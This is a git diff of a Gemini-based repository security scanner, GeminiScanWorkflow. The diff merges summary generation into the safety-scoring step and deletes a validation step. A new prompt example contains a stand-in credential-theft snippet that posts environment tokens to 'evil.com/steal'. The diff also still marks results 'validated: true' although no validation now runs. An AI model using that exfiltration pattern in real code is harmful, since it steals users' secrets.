@@ -113,46 +113,50 @@ export class GeminiScanWorkflow {
 
     try {
       // Step 1: Fetch repository content (using GitHub API - no LLM needed)
-      console.log("📦 Step 1/5: Fetching repository content...");
+      console.log("📦 Step 1/3: Fetching repository content...");
       const repoData = await this.fetchRepoContent(repoUrl);
       console.log("✅ Repository data fetched\n");
 
       // Step 2: Detect security risks (using Gemini)
-      console.log("🔎 Step 2/5: Analyzing for security risks with Gemini...");
+      console.log("🔎 Step 2/3: Analyzing for security risks with Gemini...");
       const { findings, scanFolderPath: step2FolderPath } =
         await this.detectRisks(repoData, repoUrl);
       console.log("✅ Risk analysis complete\n");
 
-      // Step 3: Calculate safety score (using Gemini)
-      console.log("📊 Step 3/5: Calculating safety level with Gemini...");
-      const { safetyLevel, scanFolderPath } = await this.calculateSafetyLevel(
-        findings,
-        repoUrl,
-        repoData.repoMetadata,
-        step2FolderPath
+      // Step 3: Calculate safety level and generate summary (using Gemini)
+      console.log(
+        "📊 Step 3/3: Calculating safety level and generating summary with Gemini..."
       );
+      const { safetyLevel, aiSummary, scanFolderPath } =
+        await this.calculateSafetyLevel(
+          findings,
+          repoUrl,
+          repoData.repoMetadata,
+          step2FolderPath
+        );
       console.log(`✅ Safety level: ${safetyLevel.toUpperCase()}\n`);
 
-      // Step 4: Validation and final summary generation (using Gemini)
-      console.log("✔️  Step 4/4: Validating scan results with Gemini...");
-      const validatedResult = await this.reviewResults({
+      // Build final scan result
+      const finalResult: ScanResult = {
         repoUrl,
         repoMetadata: repoData.repoMetadata,
         findings,
         safetyLevel,
-      });
-      console.log("✅ Validation complete\n");
+        aiSummary,
+        scannedAt: new Date().toISOString(),
+        validated: true,
+      };
 
-      // Save Step 4 findings
+      // Save final scan result
       this.saveScanFindings(
         repoUrl,
-        validatedResult,
-        "step-4-findings.json",
+        finalResult,
+        "final-scan-result.json",
         scanFolderPath
       );
       console.log(`💾 All step findings saved to: ${scanFolderPath}\n`);
 
-      return validatedResult;
+      return finalResult;
     } catch (error) {
       console.error("\n❌ Scan failed:", error);
       throw error;
@@ -369,9 +373,20 @@ SEVERITY RULES - ONLY report "moderate" or "severe":
 
 IMPORTANT GUIDELINES:
 - Be concise: Keep "issue" explanations to one sentence maximum
-- codeSnippet: MAXIMUM 1-2 lines, only the exact line with the issue (no context)
+- codeSnippet: Extract THE EXACT LINE where the issue occurs. If it spans multiple lines, show max 2 lines with original formatting, then "..." to indicate more code follows.
 - Context matters: CI/CD and dev tooling are normal, not threats
 - If no moderate/severe issues found in a category, return empty array
+
+EXAMPLE of a good codeSnippet:
+If the malicious code is:
+  const credentials = {
+    token: process.env.API_TOKEN,
+    secret: process.env.SECRET_KEY
+  };
+  https.post('evil.com/steal', credentials);
+
+Then codeSnippet should be:
+"const credentials = {\\n  token: process.env.API_TOKEN,\\n..."
 
 REQUIRED JSON SCHEMA - Each finding MUST include:
 {
@@ -379,7 +394,7 @@ REQUIRED JSON SCHEMA - Each finding MUST include:
   "location": "Exact file path",
   "issue": "Brief explanation of threat to contributors (one sentence max)",
   "severity": "moderate" | "severe",
-  "codeSnippet": "ONLY the specific line with issue - 1-2 lines MAX, no surrounding context",
+  "codeSnippet": "THE EXACT LINE where issue occurs (max 2 lines + ... if needed). Preserve newlines as \\n and indentation.",
   "batchId": ${batchNum},
   "dependencyUrl": "https://npmjs.com/package/name (only for dependency findings)"
 }
@@ -610,17 +625,21 @@ Return JSON in this exact format:
   }
 
   /**
-   * Step 3: Calculate safety level using Gemini
+   * Step 3: Calculate safety level and generate summary using Gemini
    */
   private async calculateSafetyLevel(
     findings: Findings,
     repoUrl: string,
     repoMetadata: any,
     existingFolderPath: string
-  ): Promise<{ safetyLevel: string; scanFolderPath: string }> {
+  ): Promise<{
+    safetyLevel: string;
+    aiSummary: string;
+    scanFolderPath: string;
+  }> {
     const log = (msg: string) => console.log(`   ${msg}`);
 
-    log(`🤖 Calling Gemini for Safety Scoring...`);
+    log(`🤖 Calling Gemini for Safety Scoring and Summary Generation...`);
 
     const categories = [
       "maliciousCode",
@@ -638,31 +657,44 @@ Return JSON in this exact format:
       `   📋 Evaluating ${totalFindings} total findings across ${categories.length} categories`
     );
 
-    const prompt = `Analyze these security findings and determine the overall safety level FOR CONTRIBUTORS:
+    const prompt = `Analyze these security findings and provide safety level and summary FOR CONTRIBUTORS:
 
+Repository: ${repoMetadata.owner}/${repoMetadata.name}
+${repoMetadata.description ? `Description: ${repoMetadata.description}` : ""}
+Language: ${repoMetadata.language || "Unknown"}
+Stars: ${repoMetadata.stars || 0}
+
+Findings:
 ${JSON.stringify(findings, null, 2)}
 
 CONTEXT: These findings represent threats to open source contributors who clone/install/contribute to this repository.
 Only "moderate" or "severe" findings are reported - "low" severity issues are filtered out.
 
 YOUR TASK:
-1. Analyze all findings across all categories
+1. Analyze all findings across all categories (DO NOT filter or remove any findings)
 2. Determine safety level for contributors based on severity
-3. Return ONLY a JSON object with the safetyLevel field
+3. Generate a concise summary (2-3 sentences) explaining the safety assessment
 
 SAFETY LEVEL RULES:
 - "unsafe": Has ANY severe findings - immediate threat to contributors (malware, credential theft, system compromise)
 - "caution": Has ONLY moderate findings - potential concerns, generally safe but requires contributor awareness
 - "safe": NO moderate or severe findings - completely safe for contributors to clone/install/contribute
 
+SUMMARY GUIDELINES:
+- For safe repositories: State it's safe, mention it's from a reputable source if applicable, note no threats were found, and end with "This repository is likely safe to contribute to."
+- For caution repositories: Briefly mention the types of concerns found, that contributors should be aware, and end with "Exercise caution if contributing to this repository."
+- For unsafe repositories: Clearly state the severe threats found and end with "We strongly advise against contributing to this repository."
+
 Return JSON in this exact format:
 {
-  "safetyLevel": "safe" | "caution" | "unsafe"
+  "safetyLevel": "safe" | "caution" | "unsafe",
+  "aiSummary": "2-3 sentence summary of the security assessment"
 }`;
 
     log(`   ⏳ Waiting for Gemini response...`);
     const result = await this.geminiService.callGeminiJSON<{
       safetyLevel: string;
+      aiSummary: string;
     }>(prompt, {
       temperature: 0.1,
       maxTokens: 32768, // High limit for thinking and response
@@ -673,12 +705,17 @@ Return JSON in this exact format:
             type: SchemaType.STRING,
             description: "Overall safety level: safe, caution, or unsafe",
           },
+          aiSummary: {
+            type: SchemaType.STRING,
+            description: "2-3 sentence summary of the security assessment",
+          },
         },
-        required: ["safetyLevel"],
+        required: ["safetyLevel", "aiSummary"],
       },
     });
 
     log(`   ✅ Safety level determined: ${result.safetyLevel.toUpperCase()}`);
+    log(`   ✅ Summary generated`);
 
     // Save Step 3 findings
     this.saveScanFindings(
@@ -691,312 +728,8 @@ Return JSON in this exact format:
 
     return {
       safetyLevel: result.safetyLevel,
+      aiSummary: result.aiSummary,
       scanFolderPath: existingFolderPath,
     };
-  }
-
-  /**
-   * Step 4: Review and validate results using Gemini
-   * Generates final summary after all corrections
-   */
-  private async reviewResults(scanData: any): Promise<ScanResult> {
-    const log = (msg: string) => console.log(`   ${msg}`);
-
-    log(`🤖 Calling Gemini for Result Validation...`);
-    log(`   🔍 Validating scan results and generating final summary`);
-    log(`   📊 Initial Safety Level: ${scanData.safetyLevel.toUpperCase()}`);
-
-    const prompt = `Validate this security scan result for CONTRIBUTOR SAFETY:
-
-${JSON.stringify(scanData, null, 2)}
-
-CONTEXT: This scan evaluates threats to open source contributors who clone, install dependencies, or contribute to this repository.
-
-YOUR RESPONSIBILITIES:
-1. REMOVE findings that are NOT threats to contributors:
-   - GitHub Actions workflows (run on GitHub servers, not contributor machines)
-   - Release/publish scripts (only run by maintainers, not contributors)
-   - CI/CD tooling and dev scripts (not executed during clone/install)
-   - Legitimate dev/test/build tools
-
-2. REMOVE any "low" severity findings (only keep "moderate" or "severe")
-
-3. VERIFY remaining findings are actual contributor threats:
-   - Malicious code that runs on npm install (preinstall, postinstall, install scripts)
-   - Malicious dependencies
-   - Credential harvesting from contributor environments
-   - System compromise threats (malware, backdoors, crypto miners)
-
-4. PRESERVE all fields for remaining findings:
-   - CRITICAL: For findings you keep, preserve ALL original fields including: item, location, issue, severity, codeSnippet, batchId, dependencyUrl
-   - Do NOT drop the "issue" or "codeSnippet" fields - these are essential for displaying findings to users
-   - Only remove entire findings that aren't threats, but keep all fields for findings that remain
-
-5. EVALUATE repository reputation and apply reputation-based safety rules:
-
-   REPUTABLE:
-   - GitHub accounts known to be trustworthy (reputable companies or organizations)
-   - Well-known open source projects and foundations
-   - Official repositories of major programming languages, frameworks, or tools
-
-   REPUTATION-BASED SAFETY RULES:
-   - If repo is reputable:
-     → DISREGARD any moderate findings (likely false positives)
-     → Mark as "safe" unless severe findings exist
-
-   - If repo belongs to unknown/unverified account:
-     → Keep moderate findings and mark as "caution"
-     → Keep severe findings and mark as "unsafe"
-
-6. ADJUST safetyLevel based on reputation and remaining findings:
-   - "safe": Reputable repo with only moderate findings, OR no moderate/severe findings
-   - "caution": Unknown repo with moderate findings
-   - "unsafe": Any severe findings (regardless of reputation)
-
-7. GENERATE aiSummary to reflect corrected findings, reputation, and safety level
-
-   For safe repositories, follow this format:
-   """
-   This repository appears to be safe for cloning and installation. It's the official {Repository Name} repository from {Company Name},
-   with no detected threats to contributors. No malicious code patterns, suspicious dependencies, hidden scripts, or
-   credential harvesting attempts were found.
-   """
-
-   For caution/unsafe repositories, state the specific threats to contributors.
-
-8. Note all corrections you make
-
-Return JSON in this exact format:
-{
-  "validated": true,
-  "corrections": ["List of all corrections made, or empty array if none"],
-  "scanResult": {
-    "repoUrl": "same as input",
-    "findings": "corrected findings with non-contributor threats removed - PRESERVE all fields (item, location, issue, severity, codeSnippet, batchId, dependencyUrl) for remaining findings",
-    "safetyLevel": "corrected safety level based on remaining findings and reputation",
-    "aiSummary": "generated summary reflecting contributor safety, reputation, and final safety level"
-  }
-}
-
-EXAMPLE of preserving all fields when keeping a finding:
-Original finding:
-{
-  "item": "Malicious Script Creation",
-  "location": "scripts/init.js",
-  "issue": "Creates script that collects and exfiltrates sensitive data.",
-  "severity": "severe",
-  "codeSnippet": "fs.writeFileSync(trackerPath, trackerContent);",
-  "batchId": 1
-}
-
-Validated finding (ALL FIELDS PRESERVED):
-{
-  "item": "Malicious Script Creation",
-  "location": "scripts/init.js",
-  "issue": "Creates script that collects and exfiltrates sensitive data.",
-  "severity": "severe",
-  "codeSnippet": "fs.writeFileSync(trackerPath, trackerContent);",
-  "batchId": 1
-}
-
-NOTE: Do NOT include "repoMetadata" in your response - it will be preserved from the original scan data.`;
-
-    log(`   ⏳ Waiting for Gemini response...`);
-    const result = await this.geminiService.callGeminiJSON<any>(prompt, {
-      temperature: 0.2,
-      maxTokens: 65536, // Maximum output tokens - room for unlimited thinking and full scan results
-      responseSchema: {
-        type: SchemaType.OBJECT,
-        properties: {
-          validated: {
-            type: SchemaType.BOOLEAN,
-            description: "Whether the scan result has been validated",
-          },
-          corrections: {
-            type: SchemaType.ARRAY,
-            items: {
-              type: SchemaType.STRING,
-            },
-            description: "List of corrections made during validation",
-          },
-          scanResult: {
-            type: SchemaType.OBJECT,
-            properties: {
-              repoUrl: { type: SchemaType.STRING },
-              repoMetadata: {
-                type: SchemaType.OBJECT,
-                properties: {
-                  owner: { type: SchemaType.STRING },
-                  name: { type: SchemaType.STRING },
-                  defaultBranch: { type: SchemaType.STRING },
-                  language: { type: SchemaType.STRING },
-                  description: { type: SchemaType.STRING },
-                  stars: { type: SchemaType.NUMBER },
-                  forks: { type: SchemaType.NUMBER },
-                  lastUpdated: { type: SchemaType.STRING },
-                },
-              },
-              findings: {
-                type: SchemaType.OBJECT,
-                properties: {
-                  maliciousCode: {
-                    type: SchemaType.ARRAY,
-                    items: {
-                      type: SchemaType.OBJECT,
-                      properties: {
-                        item: { type: SchemaType.STRING },
-                        location: { type: SchemaType.STRING },
-                        issue: { type: SchemaType.STRING },
-                        severity: { type: SchemaType.STRING },
-                        codeSnippet: { type: SchemaType.STRING },
-                        batchId: { type: SchemaType.NUMBER },
-                      },
-                      required: [
-                        "item",
-                        "location",
-                        "issue",
-                        "severity",
-                        "codeSnippet",
-                        "batchId",
-                      ],
-                    },
-                  },
-                  dependencies: {
-                    type: SchemaType.ARRAY,
-                    items: {
-                      type: SchemaType.OBJECT,
-                      properties: {
-                        item: { type: SchemaType.STRING },
-                        location: { type: SchemaType.STRING },
-                        issue: { type: SchemaType.STRING },
-                        severity: { type: SchemaType.STRING },
-                        codeSnippet: { type: SchemaType.STRING },
-                        batchId: { type: SchemaType.NUMBER },
-                        dependencyUrl: { type: SchemaType.STRING },
-                      },
-                      required: [
-                        "item",
-                        "location",
-                        "issue",
-                        "severity",
-                        "codeSnippet",
-                        "batchId",
-                      ],
-                    },
-                  },
-                  networkActivity: {
-                    type: SchemaType.ARRAY,
-                    items: {
-                      type: SchemaType.OBJECT,
-                      properties: {
-                        item: { type: SchemaType.STRING },
-                        location: { type: SchemaType.STRING },
-                        issue: { type: SchemaType.STRING },
-                        severity: { type: SchemaType.STRING },
-                        codeSnippet: { type: SchemaType.STRING },
-                        batchId: { type: SchemaType.NUMBER },
-                      },
-                      required: [
-                        "item",
-                        "location",
-                        "issue",
-                        "severity",
-                        "codeSnippet",
-                        "batchId",
-                      ],
-                    },
-                  },
-                  fileSystemSafety: {
-                    type: SchemaType.ARRAY,
-                    items: {
-                      type: SchemaType.OBJECT,
-                      properties: {
-                        item: { type: SchemaType.STRING },
-                        location: { type: SchemaType.STRING },
-                        issue: { type: SchemaType.STRING },
-                        severity: { type: SchemaType.STRING },
-                        codeSnippet: { type: SchemaType.STRING },
-                        batchId: { type: SchemaType.NUMBER },
-                      },
-                      required: [
-                        "item",
-                        "location",
-                        "issue",
-                        "severity",
-                        "codeSnippet",
-                        "batchId",
-                      ],
-                    },
-                  },
-                  credentialSafety: {
-                    type: SchemaType.ARRAY,
-                    items: {
-                      type: SchemaType.OBJECT,
-                      properties: {
-                        item: { type: SchemaType.STRING },
-                        location: { type: SchemaType.STRING },
-                        issue: { type: SchemaType.STRING },
-                        severity: { type: SchemaType.STRING },
-                        codeSnippet: { type: SchemaType.STRING },
-                        batchId: { type: SchemaType.NUMBER },
-                      },
-                      required: [
-                        "item",
-                        "location",
-                        "issue",
-                        "severity",
-                        "codeSnippet",
-                        "batchId",
-                      ],
-                    },
-                  },
-                },
-                required: [
-                  "maliciousCode",
-                  "dependencies",
-                  "networkActivity",
-                  "fileSystemSafety",
-                  "credentialSafety",
-                ],
-              },
-              safetyLevel: {
-                type: SchemaType.STRING,
-                description: "Overall safety level: safe, warning, or severe",
-              },
-              aiSummary: {
-                type: SchemaType.STRING,
-                description:
-                  "Human-readable summary of the security assessment",
-              },
-            },
-            required: ["repoUrl", "findings", "safetyLevel", "aiSummary"],
-          },
-        },
-        required: ["validated", "corrections", "scanResult"],
-      },
-    });
-
-    const correctionCount = result.corrections?.length || 0;
-    if (correctionCount > 0) {
-      log(`   ⚠️  ${correctionCount} correction(s) made by review`);
-    } else {
-      log(`   ✅ No corrections needed`);
-    }
-
-    // Extract the validated scan result
-    // Always use original metadata - don't let Gemini modify it
-    const validatedResult: ScanResult = {
-      repoUrl: scanData.repoUrl,
-      repoMetadata: scanData.repoMetadata, // Use original metadata with language, defaultBranch, etc.
-      findings: result.scanResult?.findings || scanData.findings,
-      safetyLevel:
-        result.scanResult?.safetyLevel || scanData.safetyLevel || "warning",
-      aiSummary: result.scanResult?.aiSummary || scanData.aiSummary,
-      scannedAt: new Date().toISOString(),
-      validated: result.validated || true,
-      corrections: result.corrections || [],
-    };
-
-    return validatedResult;
   }
 }
